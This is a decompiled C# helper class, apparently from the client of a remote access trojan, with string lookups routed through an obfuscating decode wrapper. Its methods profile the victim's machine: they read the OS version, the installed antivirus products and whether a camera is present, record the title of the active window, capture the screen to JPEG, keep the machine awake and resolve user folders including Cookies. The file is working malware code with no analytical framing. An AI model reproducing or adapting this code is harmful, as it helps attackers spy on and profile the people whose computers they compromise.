using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Reflection;
using System.Text;
using System.Windows.Forms;

namespace Client.Helper
{
	// Token: 0x0200000E RID: 14
	public class Methods
	{
		// Token: 0x0600004D RID: 77 RVA: 0x00004D14 File Offset: 0x00002F14
		public static string GetWindowsVersion()
		{
			try
			{
				using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementObjectSearcher(EncryptString.Decode("SELECT * FROM Win32_OperatingSystem")).Get().GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						ManagementObject managementObject = (ManagementObject)enumerator.Current;
						return (string)managementObject[EncryptString.Decode("Caption")] + EncryptString.Decode(" ") + (string)managementObject[EncryptString.Decode("OSArchitecture")];
					}
				}
			}
			catch
			{
			}
			return EncryptString.Decode("Error Get Version");
		}

		// Token: 0x0600004E RID: 78 RVA: 0x00004DD8 File Offset: 0x00002FD8
		public static void Exit()
		{
			MutexControl.Exit();
			Environment.Exit(0);
		}

		// Token: 0x0600004F RID: 79 RVA: 0x00004DE8 File Offset: 0x00002FE8
		public static void MaxPriority()
		{
			try
			{
				Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.RealTime;
			}
			catch
			{
			}
		}

		// Token: 0x06000050 RID: 80 RVA: 0x00004E20 File Offset: 0x00003020
		public static void PreventSleep()
		{
			try
			{
				DllImport.SetThreadExecutionState((DllImport.EXECUTION_STATE)2147483651U);
			}
			catch
			{
			}
		}

		// Token: 0x06000051 RID: 81 RVA: 0x00004E54 File Offset: 0x00003054
		public static string GetExecutablePath()
		{
			return Assembly.GetExecutingAssembly().Location;
		}

		// Token: 0x06000052 RID: 82 RVA: 0x00004E60 File Offset: 0x00003060
		public static byte[] GetResourceFile(string name)
		{
			byte[] result;
			using (Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name))
			{
				if (manifestResourceStream == null)
				{
					result = null;
				}
				else
				{
					using (MemoryStream memoryStream = new MemoryStream())
					{
						manifestResourceStream.CopyTo(memoryStream);
						result = memoryStream.ToArray();
					}
				}
			}
			return result;
		}

		// Token: 0x06000053 RID: 83 RVA: 0x00004ED8 File Offset: 0x000030D8
		public static List<string> GetHardwareInfo(string WIN32_Class, string ClassItemField)
		{
			List<string> list = new List<string>();
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(EncryptString.Decode("SELECT * FROM ") + WIN32_Class);
			try
			{
				foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
				{
					ManagementObject managementObject = (ManagementObject)managementBaseObject;
					list.Add(managementObject[ClassItemField].ToString().Trim());
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000054 RID: 84 RVA: 0x00004F78 File Offset: 0x00003178
		public static string Antivirus()
		{
			string result;
			try
			{
				string text = string.Empty;
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(EncryptString.Decode("\\\\") + Environment.MachineName + EncryptString.Decode("\\root\\SecurityCenter2"), EncryptString.Decode("Select * from AntivirusProduct")))
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						text = text + managementObject[EncryptString.Decode("displayName")].ToString() + EncryptString.Decode("; ");
					}
				}
				if (text.Length > 2)
				{
					text = text.Remove(text.Length - 2);
				}
				result = ((!string.IsNullOrEmpty(text)) ? text : EncryptString.Decode("N/A"));
			}
			catch
			{
				result = EncryptString.Decode("Unknown");
			}
			return result;
		}

		// Token: 0x06000055 RID: 85 RVA: 0x000050A4 File Offset: 0x000032A4
		public static string GetActiveWindowTitle()
		{
			try
			{
				int num = 520;
				StringBuilder stringBuilder = new StringBuilder(num);
				if (DllImport.GetWindowText(DllImport.GetForegroundWindow(), stringBuilder, num) > 0)
				{
					return stringBuilder.ToString();
				}
			}
			catch
			{
			}
			return EncryptString.Decode("[Idle]");
		}

		// Token: 0x06000056 RID: 86 RVA: 0x00005104 File Offset: 0x00003304
		public static string Camera()
		{
			try
			{
				ManagementObjectCollection managementObjectCollection = new ManagementObjectSearcher(new ObjectQuery(EncryptString.Decode("SELECT * FROM Win32_PnPEntity WHERE PNPClass = 'Camera'"))).Get();
				if (managementObjectCollection.Count > 0)
				{
					using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectCollection.GetEnumerator())
					{
						if (enumerator.MoveNext())
						{
							return (string)((ManagementObject)enumerator.Current)[EncryptString.Decode("Caption")];
						}
					}
				}
				return EncryptString.Decode("None");
			}
			catch
			{
			}
			return EncryptString.Decode("None");
		}

		// Token: 0x06000057 RID: 87 RVA: 0x000051C0 File Offset: 0x000033C0
		public static byte[] CaptureResizeReduceQuality()
		{
			int width = 100;
			int height = 100;
			long value = 100L;
			Rectangle bounds = Screen.GetBounds(Point.Empty);
			Bitmap image = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
			using (Graphics graphics = Graphics.FromImage(image))
			{
				graphics.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
			}
			Bitmap bitmap = new Bitmap(width, height);
			using (Graphics graphics2 = Graphics.FromImage(bitmap))
			{
				graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
				graphics2.DrawImage(image, 0, 0, width, height);
			}
			EncoderParameter encoderParameter = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, value);
			ImageCodecInfo encoderInfo = Methods.GetEncoderInfo(EncryptString.Decode("image/jpeg"));
			EncoderParameters encoderParameters = new EncoderParameters(1);
			encoderParameters.Param[0] = encoderParameter;
			byte[] result;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				bitmap.Save(memoryStream, encoderInfo, encoderParameters);
				result = memoryStream.ToArray();
			}
			return result;
		}

		// Token: 0x06000058 RID: 88 RVA: 0x000052FC File Offset: 0x000034FC
		private static ImageCodecInfo GetEncoderInfo(string mimeType)
		{
			foreach (ImageCodecInfo imageCodecInfo in ImageCodecInfo.GetImageEncoders())
			{
				if (imageCodecInfo.MimeType == mimeType)
				{
					return imageCodecInfo;
				}
			}
			return null;
		}

		// Token: 0x06000059 RID: 89 RVA: 0x00005340 File Offset: 0x00003540
		public static string GetPath(string pth)
		{
			pth = pth.Replace(EncryptString.Decode("%Windows%"), Environment.GetFolderPath(Environment.SpecialFolder.Windows));
			pth = pth.Replace(EncryptString.Decode("%ProgramFiles%"), Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
			pth = pth.Replace(EncryptString.Decode("%ApplicationData%"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
			pth = pth.Replace(EncryptString.Decode("%UserProfile%"), Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
			pth = pth.Replace(EncryptString.Decode("%MyDocuments%"), Environment.GetFolderPath(Environment.SpecialFolder.Personal));
			pth = pth.Replace(EncryptString.Decode("%Cookies%"), Environment.GetFolderPath(Environment.SpecialFolder.Cookies));
			pth = pth.Replace(EncryptString.Decode("%CommonPictures%"), Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
			pth = pth.Replace(EncryptString.Decode("%LocalApplicationData%"), Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
			pth = pth.Replace(EncryptString.Decode("%CommonDocuments%"), Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
			pth = pth.Replace(EncryptString.Decode("%Templates%"), Environment.GetFolderPath(Environment.SpecialFolder.Templates));
			pth = pth.Replace(EncryptString.Decode("%MyMusic%"), Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
			pth = pth.Replace(EncryptString.Decode("%MyVideos%"), Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
			return pth;
		}

		// Token: 0x04000032 RID: 50
		public static Random random = new Random();
	}
}
